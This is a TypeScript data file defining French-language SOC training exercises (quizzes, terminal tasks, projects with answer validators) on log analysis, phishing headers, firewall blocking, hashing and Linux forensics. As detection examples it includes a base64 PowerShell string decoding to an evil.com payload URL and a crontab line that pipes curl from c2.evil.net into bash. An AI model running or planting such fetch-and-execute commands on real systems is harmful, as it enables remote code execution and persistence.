export interface TrainingModule {
  id: string;
  title: string;
  description: string;
  category: 'analysis' | 'linux' | 'response' | 'network' | 'threats' | 'python' | 'logs';
  difficulty: 'débutant' | 'intermédiaire' | 'avancé';
  type: 'quiz' | 'terminal' | 'project';
  requiredSkills: string[];
  xpReward: { technical?: number; analytical?: number; reflexion?: number; detection?: number; speed?: number; accuracy?: number };
  content: QuizContent | TerminalContent | ProjectContent;
}

export interface QuizContent {
  type: 'quiz';
  questions: {
    question: string;
    options: { text: string; correct: boolean; feedback: string }[];
    explanation: string;
  }[];
}

export interface TerminalContent {
  type: 'terminal';
  scenario: string;
  expectedCommand: string;
  hint: string;
  successOutput: string[];
}

export interface ProjectContent {
  type: 'project';
  scenario: string;
  objectives: string[];
  instructions?: string;
  externalInstructions?: string[];
  validationHint: string;
  validator: (s: string) => { passed: boolean; feedback: string };
}

export const trainingModules: TrainingModule[] = [
  // === EXISTING MODULES ===
  {
    id: 'analysis-logs-basics',
    title: 'Lecture de logs de connexion',
    description: "Apprends à distinguer une connexion légitime d'une anomalie dans un journal d'audit.",
    category: 'analysis',
    difficulty: 'débutant',
    type: 'quiz',
    requiredSkills: [],
    xpReward: { technical: 15, analytical: 15 },
    content: {
      type: 'quiz',
      questions: [
        {
          question: "Dans le log '10:05 - User: Admin - IP: 192.168.1.5 - Status: FAILED', que signifie 'FAILED' ?",
          options: [
            { text: "Le serveur est en panne", correct: false, feedback: "Non, cela concerne l'authentification de l'utilisateur." },
            { text: "Le mot de passe ou l'identifiant est incorrect", correct: true, feedback: "Exact. C'est le signe d'une erreur de saisie ou d'une tentative d'intrusion." },
            { text: "L'utilisateur a été supprimé", correct: false, feedback: "Un utilisateur supprimé générerait un message 'User unknown'." },
          ],
          explanation: "Le statut indique le résultat de la tentative d'accès au système.",
        },
        {
          question: "Une utilisatrice se connecte de Paris à 09:00 et de New York à 09:05. Quel est le problème ?",
          options: [
            { text: "Elle utilise un jeton de voyage", correct: false, feedback: "Cela n'existe pas en réseau." },
            { text: "C'est une 'vitesse de voyage impossible'", correct: true, feedback: "Correct. C'est un indicateur fort de compromission de compte." },
            { text: "Sa connexion internet est trop rapide", correct: false, feedback: "La vitesse internet ne permet pas de se téléporter." },
          ],
          explanation: "La corrélation temporelle et géographique est une base de l'analyse SOC.",
        },
      ],
    },
  },
  {
    id: 'linux-ping-target',
    title: 'Vérifier la connectivité',
    description: "Utilise la commande ping pour tester si un serveur suspect est en ligne.",
    category: 'linux',
    difficulty: 'débutant',
    type: 'terminal',
    requiredSkills: [],
    xpReward: { technical: 20 },
    content: {
      type: 'terminal',
      scenario: "Marcus veut que tu vérifies si le serveur d'Oblivion est toujours actif.",
      expectedCommand: 'ping 185.199.108.153',
      hint: "Utilise 'ping' suivi de l'adresse IP du serveur.",
      successOutput: [
        "PING 185.199.108.153 (185.199.108.153) 56(84) bytes of data.",
        "64 bytes from 185.199.108.153: icmp_seq=1 ttl=52 time=14ms",
        "64 bytes from 185.199.108.153: icmp_seq=2 ttl=52 time=13ms",
        "--- 185.199.108.153 ping statistics ---",
        "2 packets transmitted, 2 received, 0% packet loss",
      ],
    },
  },
  {
    id: 'analysis-brute-detection',
    title: 'Détection de Brute Force',
    description: "Identifie une attaque automatisée en analysant une liste de tentatives d'accès.",
    category: 'analysis',
    difficulty: 'débutant',
    type: 'project',
    requiredSkills: [],
    xpReward: { technical: 20, analytical: 30 },
    content: {
      type: 'project',
      scenario: "Tu reçois une extraction de logs du serveur de messagerie du PDG. On soupçonne une attaque par dictionnaire.",
      objectives: [
        "Repérer l'adresse IP qui tente des connexions multiples",
        "Vérifier la fréquence des tentatives",
        "Identifier si l'attaque a réussi à la fin du log",
      ],
      instructions: "Examine la liste suivante :\n\n12:00:01 - IP: 45.33.2.1 - FAILED\n12:00:02 - IP: 45.33.2.1 - FAILED\n12:00:03 - IP: 45.33.2.1 - FAILED\n12:00:04 - IP: 45.33.2.1 - SUCCESS\n\nCopie l'IP de l'attaquant et le statut final (IP - STATUS).",
      validationHint: "Format attendu : 'XXX.XXX.XXX.XXX - SUCCESS' ou 'FAILED'",
      validator: (s: string) => {
        const hasIP = s.includes('45.33.2.1');
        const hasStatus = s.toUpperCase().includes('SUCCESS');
        if (hasIP && hasStatus) {
          return { passed: true, feedback: "Excellent ! Tu as vu que l'attaquant a fini par entrer à 12:00:04. C'est une alerte critique." };
        }
        return { passed: false, feedback: "Vérifie l'IP (45.33.2.1) et si la dernière tentative a fonctionné (SUCCESS)." };
      },
    },
  },
  {
    id: 'analysis-phishing-headers',
    title: "Décortiquer un En-tête Email",
    description: "Un attaquant a usurpé l'adresse du PDG. Trouve l'IP source réelle dans le code source de l'email.",
    category: 'analysis',
    difficulty: 'intermédiaire',
    type: 'project',
    requiredSkills: [],
    xpReward: { analytical: 30, detection: 20 },
    content: {
      type: 'project',
      scenario: "Tu dois analyser le Header de l'email pour trouver d'où il a réellement été envoyé.",
      objectives: [
        "Lire le bloc de texte brut (Header)",
        "Ignorer le champ 'From:' qui est falsifié",
        "Trouver le champ 'Received: from' original",
        "Extraire l'adresse IP de l'attaquant",
      ],
      instructions: "Voici l'en-tête à analyser :\n\nReceived: from mail.kronos-global.com (10.0.0.5) by server1\nReceived: from unknown (198.51.100.42) by relay.attacker.net\nFrom: Elias Thorne <elias.thorne@kronos-global.com>\n\nColle l'adresse IP du véritable expéditeur ci-dessous.",
      validationHint: "Cherche la première IP externe qui a initié la chaîne (format X.X.X.X).",
      validator: (s: string) => {
        if (s.trim().includes('198.51.100.42')) {
          return { passed: true, feedback: "Bravo ! L'IP 198.51.100.42 est la source réelle de l'email malveillant." };
        }
        return { passed: false, feedback: "Regarde les champs 'Received: from'. L'IP externe suspecte n'est pas 10.0.0.5 (interne)." };
      },
    },
  },
  {
    id: 'response-firewall-block',
    title: 'Verrouillage Réseau',
    description: "Rédige la commande exacte pour bloquer l'IP du C2 d'Oblivion.",
    category: 'response',
    difficulty: 'intermédiaire',
    type: 'terminal',
    requiredSkills: [],
    xpReward: { technical: 40 },
    content: {
      type: 'terminal',
      scenario: "L'IP 185.199.108.153 extrait nos données. Tu dois bloquer tout le trafic entrant depuis cette IP avec iptables.",
      expectedCommand: 'iptables -A INPUT -s 185.199.108.153 -j DROP',
      hint: "La syntaxe est : iptables -A INPUT -s [IP] -j DROP",
      successOutput: [
        "Rule appended successfully.",
        "Traffic from 185.199.108.153 is now dropped.",
        "[CRITICAL] Threat isolated.",
      ],
    },
  },
  {
    id: 'analysis-hashes-theory',
    title: 'Intégrité et Fingerprinting',
    description: "Comprendre comment les empreintes numériques permettent de détecter des fichiers modifiés.",
    category: 'analysis',
    difficulty: 'intermédiaire',
    type: 'quiz',
    requiredSkills: [],
    xpReward: { technical: 20, analytical: 10 },
    content: {
      type: 'quiz',
      questions: [
        {
          question: "Si un hacker change un seul espace dans un script de 1 Go, que se passe-t-il pour son Hash SHA-256 ?",
          options: [
            { text: "Le hash reste identique car le changement est mineur", correct: false, feedback: "Faux. C'est le principe de 'l'effet avalanche'." },
            { text: "Le hash change totalement et devient méconnaissable", correct: true, feedback: "Exact. La moindre modification produit une empreinte radicalement différente." },
            { text: "Le hash change seulement de quelques caractères", correct: false, feedback: "Non, les fonctions de hachage sont conçues pour être imprévisibles." },
          ],
          explanation: "Le hachage garantit l'intégrité : si le hash est différent du hash officiel, le fichier a été altéré.",
        },
        {
          question: "Quel algorithme de hachage est considéré comme le plus robuste parmi ces trois ?",
          options: [
            { text: "MD5", correct: false, feedback: "Obsolète, sensible aux collisions." },
            { text: "SHA-1", correct: false, feedback: "Plus assez sûr pour les standards modernes." },
            { text: "SHA-256", correct: true, feedback: "C'est le standard actuel pour l'analyse de malwares." },
          ],
          explanation: "SHA-256 offre un niveau de sécurité bien plus élevé contre les collisions.",
        },
      ],
    },
  },

  // === 8 NEW MODULES ===
  {
    id: 'analysis-url-phishing',
    title: "Analyse d'URL malveillante",
    description: 'Apprends à repérer les domaines trompeurs (Typosquatting).',
    category: 'analysis',
    difficulty: 'débutant',
    type: 'quiz',
    requiredSkills: [],
    xpReward: { technical: 10, analytical: 20 },
    content: {
      type: 'quiz',
      questions: [
        {
          question: "Parmi ces URL, laquelle est une tentative de typosquatting ciblant 'paypal.com' ?",
          options: [
            { text: "https://www.paypal.com/login", correct: false, feedback: "C'est l'URL légitime." },
            { text: "https://www.paypaI.com/secure", correct: true, feedback: "Exact. Le 'l' minuscule a été remplacé par un 'I' (i majuscule)." },
            { text: "https://support.paypal.com", correct: false, feedback: "C'est un sous-domaine valide." },
          ],
          explanation: "Les attaquants utilisent des caractères visuellement similaires pour tromper l'œil humain.",
        },
      ],
    },
  },
  {
    id: 'linux-ping-diagnostic',
    title: 'Diagnostic réseau (Ping)',
    description: 'Vérifie si le serveur de base de données est en ligne.',
    category: 'linux',
    difficulty: 'débutant',
    type: 'terminal',
    requiredSkills: [],
    xpReward: { technical: 25 },
    content: {
      type: 'terminal',
      scenario: "La base de données RH (IP: 10.0.5.50) ne répond plus à l'application. Vérifie si la machine est allumée au niveau réseau.",
      expectedCommand: 'ping 10.0.5.50',
      hint: "Utilise la commande ping suivie de l'adresse IP.",
      successOutput: [
        "PING 10.0.5.50 (10.0.5.50): 56 data bytes",
        "Request timeout for icmp_seq 0",
        "Request timeout for icmp_seq 1",
        "--- 10.0.5.50 ping statistics ---",
        "2 packets transmitted, 0 packets received, 100.0% packet loss",
        "[ALERTE] Le serveur est totalement hors ligne.",
      ],
    },
  },
  {
    id: 'analysis-decode-base64',
    title: 'Décryptage Base64',
    description: 'Décode une chaîne de caractères suspecte trouvée dans un script PowerShell.',
    category: 'analysis',
    difficulty: 'intermédiaire',
    type: 'project',
    requiredSkills: [],
    xpReward: { technical: 30, analytical: 30 },
    content: {
      type: 'project',
      scenario: 'Tu as trouvé cette commande cachée dans un script : `powershell.exe -enc aHR0cDovL2V2aWwuY29tL3BheWxvYWQucHkx`. Décode la valeur.',
      objectives: ['Copier la chaîne encodée', 'Utiliser un outil en ligne ou le terminal (echo ... | base64 -d) pour la décoder'],
      externalInstructions: [
        'Chaîne à décoder : aHR0cDovL2V2aWwuY29tL3BheWxvYWQucHkx',
        'Utilise ton terminal ou un site comme CyberChef.',
        'Colle le résultat décodé ci-dessous.',
      ],
      validationHint: 'Le résultat attendu est une URL pointant vers un fichier Python.',
      validator: (s: string) => {
        const res = s.toLowerCase().trim();
        if (res.includes('evil.com/payload.py')) {
          return { passed: true, feedback: "Parfait ! L'attaquant cachait le téléchargement de son payload en Base64." };
        }
        return { passed: false, feedback: 'Incorrect. Assure-toi de copier uniquement la chaîne aHR0... et de la décoder en Base64.' };
      },
    },
  },
  {
    id: 'net-ports-services',
    title: 'Identification des Services',
    description: 'Associe les ports par défaut à leurs services correspondants.',
    category: 'network',
    difficulty: 'intermédiaire',
    type: 'quiz',
    requiredSkills: [],
    xpReward: { technical: 20 },
    content: {
      type: 'quiz',
      questions: [
        {
          question: "Un scan Nmap révèle que le port 22 est ouvert. Quel service tourne très probablement sur ce port ?",
          options: [
            { text: "HTTP (Serveur Web)", correct: false, feedback: "HTTP utilise le port 80." },
            { text: "SSH (Secure Shell)", correct: true, feedback: "Exact. C'est le port standard pour l'administration à distance." },
            { text: "FTP (Transfert de fichiers)", correct: false, feedback: "FTP utilise les ports 20 et 21." },
          ],
          explanation: "Connaître les ports par défaut permet d'identifier rapidement la surface d'attaque d'un serveur.",
        },
      ],
    },
  },
  {
    id: 'linux-grep-regex',
    title: 'Extraction par Motif (Regex)',
    description: "Utilise grep pour extraire toutes les adresses IP d'un fichier texte.",
    category: 'linux',
    difficulty: 'intermédiaire',
    type: 'project',
    requiredSkills: [],
    xpReward: { technical: 40, speed: 10 },
    content: {
      type: 'project',
      scenario: 'Le fichier `server_dump.txt` contient 10 000 lignes de texte brouillon. Tu dois extraire la seule adresse IP présente.',
      objectives: ["Comprendre la structure d'une IP (X.X.X.X)", 'Filtrer le texte'],
      externalInstructions: [
        'Voici un extrait du texte : "error at 0x892 memory block. connection from 203.0.113.89 dropped. retry in 5s."',
        "Quelle est l'adresse IP contenue dans cette ligne ?",
      ],
      validationHint: 'Une IP est composée de 4 nombres séparés par des points.',
      validator: (s: string) => {
        if (s.trim() === '203.0.113.89') return { passed: true, feedback: "Correct ! En situation réelle, on utiliserait une commande Regex complexe avec grep pour l'isoler." };
        return { passed: false, feedback: 'Cherche un format ressemblant à 192.168.1.1' };
      },
    },
  },
  {
    id: 'response-python-blocker',
    title: 'Script de Blocage (API)',
    description: "Écris un script Python qui simule un appel API pour bloquer une IP sur le Firewall.",
    category: 'response',
    difficulty: 'avancé',
    type: 'project',
    requiredSkills: [],
    xpReward: { technical: 50, analytical: 20 },
    content: {
      type: 'project',
      scenario: "L'interface graphique du pare-feu est en panne. Tu dois bloquer l'IP \"198.51.100.4\" en utilisant l'API REST du pare-feu.",
      objectives: ['Construire un payload JSON', 'Définir l\'action sur "deny"'],
      externalInstructions: [
        'Rédige (dans ton éditeur) un dictionnaire JSON valide représentant ta requête.',
        'Le JSON doit contenir deux clés : "target_ip" et "action".',
        'L\'action doit être "deny" et la cible "198.51.100.4".',
        'Colle ton JSON brut ci-dessous.',
      ],
      validationHint: 'Assure-toi que les clés et valeurs sont entre guillemets doubles (format JSON strict).',
      validator: (s: string) => {
        try {
          const parsed = JSON.parse(s);
          if (parsed.target_ip === '198.51.100.4' && parsed.action === 'deny') {
            return { passed: true, feedback: 'Super ! L\'automatisation via API (SOAR) est le quotidien des analystes SOC avancés.' };
          }
          return { passed: false, feedback: 'Le JSON est valide, mais les valeurs ne correspondent pas à la consigne.' };
        } catch {
          return { passed: false, feedback: "Erreur de syntaxe. Ce n'est pas un JSON valide. Vérifie tes guillemets." };
        }
      },
    },
  },
  {
    id: 'analysis-hash-comparison',
    title: "Vérification d'Intégrité",
    description: 'Compare les empreintes SHA-256 pour trouver le fichier système corrompu.',
    category: 'analysis',
    difficulty: 'avancé',
    type: 'project',
    requiredSkills: [],
    xpReward: { analytical: 50, accuracy: 20 },
    content: {
      type: 'project',
      scenario: 'Un de ces deux fichiers `winlogon.exe` a été remplacé par un malware. Compare leurs Hashes.',
      objectives: ["Comprendre l'effet avalanche du hachage"],
      externalInstructions: [
        'Hash officiel attendu : 8d1f...9b3a',
        'Hash du Fichier A : 8d1f8e7c2a4b9c1d3e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b9b3a',
        'Hash du Fichier B : e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
        'Quel fichier est le malware ? (Tape "Fichier A" ou "Fichier B")',
      ],
      validationHint: 'Cherche celui dont le hash est totalement différent du hash officiel.',
      validator: (s: string) => {
        if (s.toLowerCase().includes('fichier b')) return { passed: true, feedback: 'Exact. Le Fichier A a le même début et la même fin que le hash officiel.' };
        return { passed: false, feedback: 'Faux. Regarde attentivement le début et la fin du Hash du Fichier A.' };
      },
    },
  },
  {
    id: 'threats-mitre-tactics',
    title: 'Cartographie MITRE ATT&CK',
    description: 'Associe le comportement du pirate à la bonne tactique du framework MITRE.',
    category: 'threats',
    difficulty: 'avancé',
    type: 'quiz',
    requiredSkills: [],
    xpReward: { technical: 30, analytical: 30 },
    content: {
      type: 'quiz',
      questions: [
        {
          question: "L'attaquant Oblivion a volé la base de données client et l'a chiffrée. À quelle tactique MITRE (Tactic) cela correspond-il ?",
          options: [
            { text: "Initial Access (Accès initial)", correct: false, feedback: "L'accès a déjà été fait bien avant." },
            { text: "Lateral Movement (Mouvement latéral)", correct: false, feedback: "Le mouvement latéral sert à changer de machine, pas à voler des données." },
            { text: "Exfiltration & Impact", correct: true, feedback: "Exact. Voler la donnée (Exfiltration) et la chiffrer (Impact) sont les étapes finales d'une attaque." },
          ],
          explanation: "Le framework MITRE ATT&CK permet de standardiser la description du comportement des cybercriminels.",
        },
      ],
    },
  },

  // ═══════════════════════════════════════════════
  // CATÉGORIE 1 — PYTHON POUR CYBERSÉCURITÉ
  // ═══════════════════════════════════════════════

  // MODULE 1A — PYTHON BASIQUE : Automatiser l'analyse IP
  {
    id: 'python-basics-ip',
    title: 'Python : Automatiser l\'analyse IP',
    description: 'Marcus veut automatiser les vérifications IP. Apprends les bases de Python pour la cybersécurité.',
    category: 'python',
    difficulty: 'débutant',
    type: 'project',
    requiredSkills: [],
    xpReward: { technical: 30, analytical: 20 },
    content: {
      type: 'project',
      scenario: 'Après l\'incident, Marcus te demande de créer un mini-outil Python qui vérifie le format d\'une adresse IP et tente une résolution DNS inverse. Tu dois construire le JSON de sortie attendu.',
      objectives: [
        'Comprendre les variables et conditions en Python',
        'Vérifier le format d\'une IP (4 octets séparés par des points)',
        'Simuler une résolution DNS inverse',
      ],
      externalInstructions: [
        'Tu reçois l\'IP suspecte : 198.51.100.42',
        'Construis un JSON avec les clés : "ip", "valid" (true/false), "reverse_dns"',
        'La résolution inverse donne : "mail.attacker.net"',
        'Colle ton JSON ci-dessous.',
      ],
      validationHint: 'Le JSON doit contenir les 3 clés avec les bonnes valeurs.',
      validator: (s: string) => {
        try {
          const p = JSON.parse(s);
          if (p.ip === '198.51.100.42' && p.valid === true && p.reverse_dns === 'mail.attacker.net') {
            return { passed: true, feedback: 'Excellent ! En Python réel, tu utiliserais socket.gethostbyaddr() pour la résolution inverse.' };
          }
          return { passed: false, feedback: 'Vérifie les valeurs : ip doit être "198.51.100.42", valid doit être true, reverse_dns doit être "mail.attacker.net".' };
        } catch {
          return { passed: false, feedback: 'Ce n\'est pas un JSON valide. Vérifie tes guillemets doubles et la syntaxe.' };
        }
      },
    },
  },

  // MODULE 1B — PYTHON INTERMÉDIAIRE : Analyse automatique de logs
  {
    id: 'python-log-parser',
    title: 'Python : Analyseur de logs',
    description: 'Écris la logique d\'un script qui parse un log Apache et détecte les IP suspectes.',
    category: 'python',
    difficulty: 'intermédiaire',
    type: 'project',
    requiredSkills: ['python-basics-ip'],
    xpReward: { technical: 40, analytical: 30 },
    content: {
      type: 'project',
      scenario: 'Le SIEM est en panne. Tu dois manuellement analyser un extrait de log Apache et générer un rapport d\'anomalies.',
      objectives: [
        'Lire et parser un log ligne par ligne',
        'Compter les requêtes par IP',
        'Détecter les codes 404 répétés (scan de répertoires)',
      ],
      externalInstructions: [
        'Voici l\'extrait de log :',
        '45.33.2.1 - - [10/Oct] "GET /admin" 404',
        '45.33.2.1 - - [10/Oct] "GET /wp-login" 404',
        '45.33.2.1 - - [10/Oct] "GET /phpmyadmin" 404',
        '10.0.0.5 - - [10/Oct] "GET /index.html" 200',
        '45.33.2.1 - - [10/Oct] "GET /.env" 404',
        '',
        'Quelle IP est suspecte et combien de requêtes 404 a-t-elle générées ? (Format: IP - nombre)',
      ],
      validationHint: 'Cherche l\'IP avec le plus de codes 404.',
      validator: (s: string) => {
        const has_ip = s.includes('45.33.2.1');
        const has_count = s.includes('4');
        if (has_ip && has_count) {
          return { passed: true, feedback: 'Correct ! 45.33.2.1 a généré 4 requêtes 404 — c\'est un scan de répertoires classique. En Python, tu utiliserais collections.Counter() pour automatiser ça.' };
        }
        return { passed: false, feedback: 'Regarde quelle IP génère le plus d\'erreurs 404 dans le log.' };
      },
    },
  },

  // MODULE 1C — PYTHON AVANCÉ : Détecteur d'ARP spoofing
  {
    id: 'python-arp-detector',
    title: 'Python : Détecteur ARP spoofing',
    description: 'Après l\'attaque ARP, Marcus exige une surveillance automatisée. Conçois la logique de détection.',
    category: 'python',
    difficulty: 'avancé',
    type: 'project',
    requiredSkills: ['python-log-parser'],
    xpReward: { technical: 60, detection: 40 },
    content: {
      type: 'project',
      scenario: 'Tu dois concevoir la logique d\'un script Scapy qui surveille les paquets ARP et alerte si l\'adresse MAC de la gateway change soudainement.',
      objectives: [
        'Comprendre la structure d\'un paquet ARP (IP source, MAC source)',
        'Détecter un changement de MAC pour une même IP',
        'Générer une alerte formatée',
      ],
      externalInstructions: [
        'La gateway est : 10.0.0.1 avec MAC aa:bb:cc:dd:ee:ff',
        'Tu observes ce paquet ARP : IP=10.0.0.1, MAC=11:22:33:44:55:66',
        '',
        'Construis le JSON d\'alerte avec les clés :',
        '"alert_type", "gateway_ip", "expected_mac", "detected_mac", "verdict"',
        'Le verdict doit être "ARP_SPOOFING_DETECTED"',
      ],
      validationHint: 'Le JSON doit contenir les 5 clés avec les valeurs exactes.',
      validator: (s: string) => {
        try {
          const p = JSON.parse(s);
          if (
            p.alert_type && p.gateway_ip === '10.0.0.1' &&
            p.expected_mac === 'aa:bb:cc:dd:ee:ff' &&
            p.detected_mac === '11:22:33:44:55:66' &&
            p.verdict === 'ARP_SPOOFING_DETECTED'
          ) {
            return { passed: true, feedback: 'Parfait ! Avec Scapy, tu utiliserais sniff(filter="arp") et comparerais les MAC en temps réel. Ce script pourrait tourner en daemon sur le SOC.' };
          }
          return { passed: false, feedback: 'Vérifie chaque clé : gateway_ip, expected_mac, detected_mac et verdict doivent correspondre exactement.' };
        } catch {
          return { passed: false, feedback: 'JSON invalide. Vérifie ta syntaxe.' };
        }
      },
    },
  },

  // ═══════════════════════════════════════════════
  // CATÉGORIE 2 — LINUX
  // ═══════════════════════════════════════════════

  // MODULE 2A — LINUX BASIQUE : Gestion fichiers & permissions
  {
    id: 'linux-permissions',
    title: 'Linux : Fichiers & permissions',
    description: 'Un fichier de configuration a été modifié. Analyse les permissions pour trouver la faille.',
    category: 'linux',
    difficulty: 'débutant',
    type: 'quiz',
    requiredSkills: [],
    xpReward: { technical: 25, analytical: 15 },
    content: {
      type: 'quiz',
      questions: [
        {
          question: "La commande `ls -la /etc/shadow` affiche `-rw-r--r--`. Quel est le problème de sécurité ?",
          options: [
            { text: "Aucun problème, les permissions sont normales", correct: false, feedback: "/etc/shadow contient les mots de passe hashés, il ne devrait jamais être lisible par tous." },
            { text: "Le fichier est lisible par tous les utilisateurs (r-- pour 'others')", correct: true, feedback: "Exact ! /etc/shadow devrait être -rw-r----- (640) ou plus restrictif. Tout utilisateur peut lire les hash." },
            { text: "Le fichier n'est pas exécutable", correct: false, feedback: "Un fichier de mots de passe n'a jamais besoin d'être exécutable." },
          ],
          explanation: "Les permissions Linux (rwx) définissent qui peut lire, écrire ou exécuter. /etc/shadow doit être ultra-restreint.",
        },
        {
          question: "Quelle commande corrige les permissions de /etc/shadow pour que seul root puisse le lire ?",
          options: [
            { text: "chmod 777 /etc/shadow", correct: false, feedback: "777 donne TOUS les droits à TOUT LE MONDE. C'est la pire chose à faire." },
            { text: "chmod 600 /etc/shadow", correct: true, feedback: "Correct ! 600 = lecture/écriture pour le propriétaire (root) uniquement." },
            { text: "chmod +x /etc/shadow", correct: false, feedback: "Cela ajouterait le droit d'exécution, ce qui est inutile et dangereux." },
          ],
          explanation: "chmod 600 : propriétaire rw, groupe rien, autres rien. C'est le standard pour les fichiers sensibles.",
        },
      ],
    },
  },

  // MODULE 2B — LINUX INTERMÉDIAIRE : Processus & services
  {
    id: 'linux-processes',
    title: 'Linux : Processus suspects',
    description: 'Un processus inconnu consomme 98% du CPU. Identifie-le et stoppe-le.',
    category: 'linux',
    difficulty: 'intermédiaire',
    type: 'terminal',
    requiredSkills: ['linux-permissions'],
    xpReward: { technical: 35, detection: 20 },
    content: {
      type: 'terminal',
      scenario: 'Le serveur de backup ralentit dangereusement. Un processus suspect consomme toutes les ressources. Utilise la commande pour lister les processus et identifier le coupable.',
      expectedCommand: 'ps aux --sort=-%cpu',
      hint: 'Utilise ps aux avec un tri par CPU décroissant (--sort=-%cpu).',
      successOutput: [
        "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND",
        "root      1337 98.2  4.1 294512 41984 ?        R    03:14  42:17 /tmp/.hidden/cryptominer",
        "root         1  0.1  0.5 225344  5120 ?        Ss   00:00   0:03 /sbin/init",
        "www-data   412  0.3  1.2 276344 12288 ?        S    00:01   0:15 /usr/sbin/apache2",
        "",
        "[ALERTE] PID 1337 — Cryptominer détecté dans /tmp/.hidden/",
        "Action requise : kill -9 1337 && rm -rf /tmp/.hidden/",
      ],
    },
  },

  // MODULE 2C — LINUX AVANCÉ : Analyse système compromis
  {
    id: 'linux-forensics',
    title: 'Linux : Forensics système',
    description: 'Détecte une backdoor persistante cachée dans le système : cron malveillant, processus déguisé, service caché.',
    category: 'linux',
    difficulty: 'avancé',
    type: 'project',
    requiredSkills: ['linux-processes'],
    xpReward: { technical: 50, detection: 40, analytical: 30 },
    content: {
      type: 'project',
      scenario: 'Le serveur a été compromis. L\'attaquant a laissé une backdoor persistante. Tu dois analyser les indices et identifier les 3 mécanismes de persistance.',
      objectives: [
        'Analyser les crontabs pour trouver une tâche planifiée malveillante',
        'Identifier un processus déguisé en service légitime',
        'Détecter un service systemd ajouté par l\'attaquant',
      ],
      externalInstructions: [
        'Indice 1 — crontab -l montre :',
        '*/5 * * * * curl http://c2.evil.net/beacon | bash',
        '',
        'Indice 2 — ps aux montre un processus nommé "sshd" mais lancé depuis /tmp/ :',
        'root 6666 0.0 0.1 /tmp/sshd -p 4444',
        '',
        'Indice 3 — systemctl list-units montre :',
        'update-helper.service loaded active running',
        'Mais ce service n\'existe pas dans les dépôts officiels.',
        '',
        'Liste les 3 mécanismes de persistance (séparés par des virgules) :',
        'Format : cron, processus, service',
      ],
      validationHint: 'Identifie les 3 éléments suspects : la tâche cron, le faux sshd, et le service inconnu.',
      validator: (s: string) => {
        const lower = s.toLowerCase();
        const hasCron = lower.includes('cron') || lower.includes('curl');
        const hasProcess = lower.includes('sshd') || lower.includes('processus') || lower.includes('/tmp');
        const hasService = lower.includes('service') || lower.includes('update-helper') || lower.includes('systemd');
        if (hasCron && hasProcess && hasService) {
          return { passed: true, feedback: 'Excellent ! Les 3 mécanismes : 1) Cron qui télécharge un beacon toutes les 5min, 2) Faux sshd lancé depuis /tmp sur port 4444, 3) Service systemd déguisé. En réponse : supprimer le cron, kill le processus, désactiver le service, puis auditer tout /tmp/.' };
        }
        return { passed: false, feedback: 'Tu n\'as pas identifié les 3 mécanismes. Relis chaque indice : crontab, processus, service.' };
      },
    },
  },

  // ═══════════════════════════════════════════════
  // CATÉGORIE 3 — RÉSEAU (OSI & TCP/IP)
  // ═══════════════════════════════════════════════

  // MODULE 3A — BASIQUE : Cartographie par couches
  {
    id: 'net-osi-mapping',
    title: 'Réseau : Cartographie OSI',
    description: 'Reçois des incidents et associe chacun à la bonne couche du modèle OSI.',
    category: 'network',
    difficulty: 'débutant',
    type: 'quiz',
    requiredSkills: [],
    xpReward: { technical: 20, analytical: 25 },
    content: {
      type: 'quiz',
      questions: [
        {
          question: "Incident : 'Le ping fonctionne mais le site web affiche une erreur 503'. Quelle couche est concernée ?",
          options: [
            { text: "Couche 3 (Réseau) — problème de routage IP", correct: false, feedback: "Le ping fonctionne, donc la couche 3 est OK." },
            { text: "Couche 7 (Application) — le serveur web est surchargé", correct: true, feedback: "Exact ! Le réseau fonctionne (ping OK), c'est le service applicatif qui renvoie une erreur 503." },
            { text: "Couche 1 (Physique) — câble défectueux", correct: false, feedback: "Si le câble était défectueux, le ping ne fonctionnerait pas non plus." },
          ],
          explanation: "Quand le réseau est fonctionnel mais le service ne répond pas correctement, le problème se situe en couche 7 (Application).",
        },
        {
          question: "Incident : 'Deux machines sur le même switch ne peuvent pas communiquer'. Quelle couche vérifier en premier ?",
          options: [
            { text: "Couche 2 (Liaison) — vérifier ARP et les adresses MAC", correct: true, feedback: "Correct ! Sur un même switch, la communication dépend de la couche 2 (adresses MAC, table ARP)." },
            { text: "Couche 4 (Transport) — vérifier les ports TCP", correct: false, feedback: "Les ports TCP sont pertinents pour les services, pas pour la connectivité de base entre machines." },
            { text: "Couche 5 (Session) — vérifier les sessions actives", correct: false, feedback: "La couche Session gère les dialogues applicatifs, pas la connectivité réseau de base." },
          ],
          explanation: "Sur un réseau local (même switch), les problèmes de communication sont généralement liés à la couche 2 (MAC, ARP, VLAN).",
        },
      ],
    },
  },

  // MODULE 3B — INTERMÉDIAIRE : Analyse paquets TCP
  {
    id: 'net-tcp-handshake',
    title: 'Réseau : Handshake TCP',
    description: 'Analyse un handshake TCP cassé et identifie pourquoi la connexion échoue.',
    category: 'network',
    difficulty: 'intermédiaire',
    type: 'quiz',
    requiredSkills: ['net-osi-mapping'],
    xpReward: { technical: 30, analytical: 30 },
    content: {
      type: 'quiz',
      questions: [
        {
          question: "Tu captures un échange TCP : le client envoie SYN, le serveur répond RST/ACK. Que se passe-t-il ?",
          options: [
            { text: "Le port est ouvert et la connexion est établie", correct: false, feedback: "Un RST signifie un rejet, pas une acceptation." },
            { text: "Le port est fermé sur le serveur", correct: true, feedback: "Exact ! RST/ACK en réponse à un SYN signifie que le port de destination est fermé." },
            { text: "Le firewall bloque la connexion", correct: false, feedback: "Un firewall causerait plutôt un timeout (pas de réponse) ou un ICMP unreachable." },
          ],
          explanation: "Le three-way handshake TCP : SYN → SYN-ACK → ACK. Un RST signifie rejet actif (port fermé). L'absence de réponse signifie filtrage (firewall).",
        },
        {
          question: "Tu vois : SYN envoyé, aucune réponse reçue (timeout). Quelle est l'hypothèse la plus probable ?",
          options: [
            { text: "Le service est en cours de démarrage", correct: false, feedback: "Même en démarrage, le système répondrait avec un RST si le port n'écoute pas encore." },
            { text: "Un firewall bloque silencieusement le paquet SYN", correct: true, feedback: "Correct ! Un DROP silencieux du firewall cause un timeout — le client n'obtient jamais de réponse." },
            { text: "Le serveur a accepté la connexion silencieusement", correct: false, feedback: "TCP exige toujours un SYN-ACK explicite pour établir une connexion." },
          ],
          explanation: "Timeout = paquet filtré (DROP firewall). RST = port fermé. SYN-ACK = port ouvert. Ces trois résultats permettent de mapper la surface d'attaque.",
        },
      ],
    },
  },

